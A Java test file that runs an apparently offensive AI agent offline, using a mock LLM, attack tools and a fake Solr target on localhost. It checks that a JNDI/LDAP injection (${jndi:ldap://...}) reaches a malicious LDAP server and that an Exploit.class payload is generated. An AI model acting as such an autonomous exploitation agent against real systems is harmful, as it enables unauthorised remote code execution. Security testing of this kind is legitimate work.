package agent;

import dev.langchain4j.data.message.ChatMessage;
import dev.langchain4j.data.message.ToolExecutionResultMessage;
import dev.langchain4j.memory.chat.MessageWindowChatMemory;
import dev.langchain4j.service.AiServices;
import toolkit.HttpFileServer;
import toolkit.MaliciousLDAPServer;

import java.io.File;

/**
 * Agent 离线自检：无真实 LLM、无真实靶机，完整跑通
 * "LLM 决策 -→ 工具执行 -→ 结果回填 -→ 继续决策" 的 Agent 循环
 *
 * 验证内容：
 *   1. @Tool 工具被 AiServices 正确发现并执行；
 *   2. 模拟靶机（FakeTarget）收到 payload，并因 ${jndi:ldap://...} 触发真实 LDAP bind/search 握手 —— ldapSearchHits 增加是计数来的；
 *   3. 变体命中的观察结果（命中）经 ToolExecutionResultMessage 回填给 LLM；
 *   4. Agent 给出最终汇报。
 */
public class AgentTest {

    static int failed = 0;

    public static void main(String[] args) throws Exception {
        System.out.println("=== Agent 离线自检（Mock LLM + FakeTarget）===");

        // 0) 配置：attackerIp 固定为 127.0.0.1（所有服务与模拟靶机同机）
        AgentConfig cfg = new AgentConfig("127.0.0.1");
        AttackTools.configure(cfg);
        MaliciousLDAPServer.resetSearchHits();
        HttpFileServer.resetHttpHits();

        // 1) 模拟靶机（扮演 Solr：400 + 真实 LDAP 回调）
        FakeTargetServer target = new FakeTargetServer(18080);
        target.start();
        System.out.println("[*] FakeTarget listening on 127.0.0.1:18080");

        // 2) 与真实运行完全相同的装配路径：AiServices + 记忆 + 工具
        MockChatModel model = MockChatModel.standardScript("127.0.0.1", 18080);
        AgentMain.Assistant assistant = AiServices.builder(AgentMain.Assistant.class)
                .chatModel(model)
                .chatMemory(MessageWindowChatMemory.withMaxMessages(40))
                .tools(new AttackTools(), new PayloadVariantTool())
                .build();

        // 3) 运行 Agent
        System.out.println("----- Agent 开始执行（脚本决策，真实工具）-----");
        String answer = assistant.chat(
                "目标 127.0.0.1:18080，注入点路径 /solr/admin/cores。请开始。");
        System.out.println("----- Agent 最终回答 -----");
        System.out.println(answer);

        // 4) 断言
        check("模型收到 8 次请求（7 次工具决策 + 1 次总结）", model.received.size() == 8);
        check("模拟靶机收到至少 1 次请求", target.requests.get() >= 1);
        check("LDAP searchHits > 0（v02 变体命中，真实握手计数）",
                MaliciousLDAPServer.getSearchHits() > 0);
        check("恶意类 Exploit.class 已生成", new File("exploit_dir/Exploit.class").exists());
        check("变体命中结果已回填给模型（ToolExecutionResultMessage 含 ★ 命中）",
                sawToolResultContaining(model, "★ 命中"));
        check("Agent 最终回答包含命中结论", answer.contains("命中"));
        check("触发顺序正确：tryPayloadVariant 在 getCallbackStats 之前",
                toolCallOrder(model, "tryPayloadVariant") < toolCallOrder(model, "getCallbackStats"));

        target.stop();
        System.out.println(failed == 0
                ? "\n[PASS] Agent 离线自检全部通过（" + model.received.size() + " 个决策回合）"
                : "\n[FAIL] " + failed + " 项未通过");
        System.exit(failed > 0 ? 1 : 0);
    }

    /** 任一请求的消息列表里出现过含关键字的结果回填消息 */
    static boolean sawToolResultContaining(MockChatModel m, String keyword) {
        for (var req : m.received) {
            for (ChatMessage msg : req.messages()) {
                if (msg instanceof ToolExecutionResultMessage ter
                        && ter.text().contains(keyword)) {
                    return true;
                }
            }
        }
        return false;
    }

    /** 该工具调用发生在第几次请求中（用于验证脚本决策顺序） */
    static int toolCallOrder(MockChatModel m, String toolName) {
        for (int i = 0; i < m.received.size(); i++) {
            for (ChatMessage msg : m.received.get(i).messages()) {
                if (msg instanceof dev.langchain4j.data.message.AiMessage ai
                        && ai.toolExecutionRequests() != null) {
                    for (var req : ai.toolExecutionRequests()) {
                        if (toolName.equals(req.name())) {
                            return i;
                        }
                    }
                }
            }
        }
        return Integer.MAX_VALUE;
    }

    static void check(String name, boolean ok) {
        System.out.println((ok ? "[PASS] " : "[FAIL] ") + name);
        if (!ok) {
            failed++;
        }
    }
}
